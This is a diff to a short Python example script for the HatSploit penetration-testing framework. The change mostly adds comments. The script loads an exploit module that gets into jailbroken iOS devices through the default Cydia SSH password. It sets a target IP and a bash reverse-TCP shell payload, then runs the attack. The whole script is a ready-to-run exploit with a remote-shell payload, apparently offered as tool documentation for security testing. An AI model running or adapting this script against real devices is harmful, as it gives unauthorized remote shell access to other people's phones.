@@ -1,14 +1,15 @@
-from hatsploit.lib.runtime import Runtime
-from hatsploit.lib.modules import Modules
+from hatsploit.lib.runtime import Runtime # Import HatSploit Runtime API
+from hatsploit.lib.modules import Modules # Import HatSploit Modules API
 
-runtime = Runtime()
-modules = Modules()
+runtime = Runtime() # Load HatSploit Runtime API
+modules = Modules() # Load HatSploit Modules API
 
-runtime.start()
-modules.use_module("exploit/apple_ios/ssh/cydia_default_password")
+runtime.start()                                                    # Start HatSploit Framework
+modules.use_module("exploit/apple_ios/ssh/cydia_default_password") # Select module
 
-runtime.update()
+runtime.update() # Update HatSploit states
 
-modules.set_current_module_option('HOST', '192.168.1.68')
-modules.set_current_module_option('PAYLOAD', 'unix/generic/bash_reverse_tcp')
-modules.run_current_module()
+modules.set_current_module_option('HOST', '192.168.1.68')                     # Set module option (target host)
+modules.set_current_module_option('PAYLOAD', 'unix/generic/bash_reverse_tcp') # Set module option (payload)
+
+runtime.catch(modules.run_current_module) # Run current module and catch exceptions
